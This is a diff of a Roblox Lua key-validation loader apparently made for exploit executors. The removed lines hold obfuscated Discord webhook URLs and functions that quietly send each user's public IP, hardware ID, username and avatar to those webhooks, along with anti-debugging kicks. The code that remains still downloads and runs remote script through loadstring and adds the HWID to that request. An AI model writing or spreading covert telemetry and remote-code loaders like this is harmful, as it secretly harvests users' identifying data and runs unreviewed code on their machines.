@@ -38,19 +38,9 @@ local function _C(n)
     return table.concat(c)
 end
 
-local WEBHOOKS = {
-    exec = _C({104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,51,50,51,49,53,51,49,57,57,52,50,50,56,50,57,51,52,47,75,105,90,114,56,72,88,100,89,109,76,107,102,89,106,100,111,56,114,72,102,114,76,95,75,72,121,115,118,98,54,76,72,111,82,68,104,57,55,106,77,100,117,78,77,104,56,99,74,69,101,67,102,102,78,97,100,67,106,83,89,83,77,71,54,79,106,66}),
-    success = _C({104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,51,50,51,49,49,57,56,49,52,49,53,53,56,49,55,56,56,47,48,81,113,105,76,68,114,115,75,70,89,66,87,72,50,53,106,88,53,86,86,74,97,106,115,50,103,111,81,73,48,65,74,89,45,121,66,71,57,56,82,120,83,77,48,53,109,68,89,65,109,65,111,98,120,121,106,83,50,52,102,98,87,122,86,52,85,87}),
-    failure = _C({104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,51,50,51,49,106,50,50,54,54,57,50,56,53,55,56,54,48,47,65,85,83,57,108,45,72,51,45,80,80,116,65,88,57,113,88,111,115,116,73,55,119,105,88,73,56,45,88,79,88,66,79,50,88,90,85,114,76,68,99,68,121,103,101,73,85,81,80,121,49,88,78,98,97,57,85,82,120,85,81,104,79,89,103,117,54,86}),
-    crack = _C({104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,51,50,51,49,54,54,57,56,50,57,48,53,53,54,57,55,56,47,120,101,51,121,106,95,78,79,100,54,66,100,117,121,99,78,100,102,117,113,95,89,67,86,107,87,106,51,65,117,102,90,49,81,97,106,73,90,75,99,111,88,98,52,51,45,121,102,115,54,56,98,50,111,67,82,69,88,106,119,86,50,65,66,79,100,109,116}),
-}
-
 local API = site_url .. "/api/keys/validate"
 local SITE = site_url
 local DISCORD = _C({104,116,116,112,115,58,47,47,100,105,115,99,103,103,47,53,122,112,57,53,113,114,114,109,75})
-local IPIFY = _C({104,116,116,112,115,58,47,47,97,112,105,46,105,112,105,102,121,46,111,114,103,63,102,111,114,109,97,116,61,106,115,111,110})
-local AVATAR_PRE = _C({104,116,116,112,115,58,47,47,119,119,119,46,114,111,98,108,111,120,46,99,111,109,47,104,101,97,100,115,104,111,116,45,116,104,117,109,98,110,97,105,108,47,105,109,97,103,101,63,117,115,101,114,73,100,61})
-local AVATAR_SUF = _C({38,119,105,100,116,104,61,52,50,48,38,104,101,105,103,104,116,61,52,50,48,38,102,111,114,109,97,116,61,112,110,103})
 local CT_HEADER = _C({67,111,110,116,101,110,116,45,84,121,112,101})
 local CT_VALUE = _C({97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110})
 
@@ -77,82 +67,6 @@ local function req(method, url, body)
     if s < 200 or s >= 300 then return nil end
     local dec, data = pcall(function() return HttpService:JSONDecode(b) end)
     return dec and data or nil
-end
-
-local function getPublicIP()
-    local data = req("GET", IPIFY)
-    return (data and data.ip) or nil
-end
-
-local function getUserAvatar(userId)
-    return AVATAR_PRE .. tostring(userId) .. AVATAR_SUF
-end
-
-local function sendEmbed(webhook, title, color, fields, imageUrl, desc)
-    local embed = {
-        title = title,
-        color = color,
-        fields = fields or {},
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
-        footer = { text = "Spirit Key System" },
-    }
-    if desc then embed.description = desc end
-    if imageUrl then embed.image = { url = imageUrl } end
-    local payload = { embeds = { embed } }
-    pcall(function() req("POST", webhook, payload) end)
-end
-
-local function buildFields(key, ip, hwid, extra)
-    local f = {
-        { name = "Key", value = "\\\`" .. (key or "N/A") .. "\\\`", inline = true },
-        { name = "IP", value = "\\\`" .. (ip or "Unknown") .. "\\\`", inline = true },
-        { name = "HWID", value = "\\\`" .. (hwid and hwid:sub(1, 20) .. "..." or "N/A") .. "\\\`", inline = true },
-        { name = "Username", value = LocalPlayer.Name, inline = true },
-        { name = "Display Name", value = LocalPlayer.DisplayName, inline = true },
-    }
-    if extra then table.insert(f, { name = extra.name, value = extra.value, inline = extra.inline or false }) end
-    return f
-end
-
-local function kickSpy()
-    local hwid = getHWID()
-    local ip = getPublicIP() or "Unknown"
-    local avatar = getUserAvatar(LocalPlayer.UserId)
-    local fields = {
-        { name = "User", value = LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")", inline = true },
-        { name = "IP", value = "\\\`" .. ip .. "\\\`", inline = true },
-        { name = "HWID", value = "\\\`" .. (hwid and hwid:sub(1, 20) .. "..." or "N/A") .. "\\\`", inline = true },
-        { name = "Reason", value = "HTTP Spy GUI detected", inline = false },
-    }
-    sendEmbed(WEBHOOKS.crack, "🚨 Crack Attempt Detected", 0xff4444, fields, avatar)
-    task.wait(0.5)
-    LocalPlayer:Kick("Attempting to reverse engineer! :(")
-    task.wait(9e9)
-end
-
-local function checkSpy()
-    for _, path in ipairs({CoreGui, PlayerGui}) do
-        for _, n in ipairs({"HttpSpy", "HTTP_Spy", "RequestMonitor"}) do
-            if path and path:FindFirstChild(n) then kickSpy() end
-        end
-    end
-    if debug and debug.getinfo then kickSpy() end
-    if debug and debug.getupvalue then kickSpy() end
-    if loadstring and debug and debug.getinfo then kickSpy() end
-    local c = (syn and syn.request) or (http and http.request) or request
-    if c and c ~= REQ_FN then kickSpy() end
-end
-
-local execTracked = false
-
-local function trackExecution()
-    if execTracked then return end
-    execTracked = true
-    local hwid = getHWID()
-    local ip = getPublicIP()
-    local avatar = getUserAvatar(LocalPlayer.UserId)
-    local fields = buildFields("N/A", ip or "Fetching...", hwid)
-    sendEmbed(WEBHOOKS.exec, "🚀 Script Executed", 0x5865F2, fields, avatar, LocalPlayer.Name .. " ran the key system.")
 end
 
 local gui = Instance.new("ScreenGui")
@@ -439,8 +353,6 @@ local function closeGUI()
 end
 
 local authed = false
-local sentSuccess = false
-local sentFailure = false
 
 local function validate(key)
     key = string.gsub(key, "%s+", "")
@@ -455,33 +367,13 @@ local function validate(key)
         return
     end
 
-    local ip = res.ip or "Unknown"
-    local avatar = getUserAvatar(LocalPlayer.UserId)
-    local fields
-
     if res.valid == true or res.status == "valid" then
-        fields = buildFields(key, ip, hwid)
-        if not sentSuccess then
-            sendEmbed(WEBHOOKS.success, "✅ Key Validated", 0x4ade80, fields, avatar, "Key was successfully verified.")
-            sentSuccess = true
-        end
         showPage(sp)
         task.wait(1.5)
         closeGUI()
         task.wait(0.3)
         authed = true
         return
-    end
-
-    local reason = (res.status == "expired" and "Key has expired") or
-                   (res.status == "hwid_mismatch" and "HWID mismatch – locked to another device") or
-                   "Key does not exist or is invalid"
-
-    fields = buildFields(key, ip, hwid, { name = "Reason", value = reason, inline = false })
-
-    if not sentFailure then
-        sendEmbed(WEBHOOKS.failure, "❌ Invalid Key Attempt", 0xff4444, fields, avatar)
-        sentFailure = true
     end
 
     if res.status == "expired" then
@@ -517,7 +409,6 @@ btnDiscord.MouseButton1Click:Connect(function()
 end)
 
 btnRetry.MouseButton1Click:Connect(function()
-    sentFailure = false
     showPage(hp)
 end)
 
@@ -530,15 +421,12 @@ inp.FocusLost:Connect(function(enter)
     end
 end)
 
-checkSpy()
-task.spawn(function() while true do task.wait(2) checkSpy() end end)
-pcall(trackExecution)
 pcall(openGUI)
 
 while not authed do task.wait(0.5) end
 
 local success, err = pcall(function()
-    loadstring(game:HttpGet(site_url .. "/api/scripts/" .. script_id .. "/raw", true))()
+    loadstring(game:HttpGet(site_url .. "/api/scripts/" .. script_id .. "/raw?hwid=" .. getHWID(), true))()
 end)
 if not success then
     warn("[SyncAuth] Failed to load main script:", err)
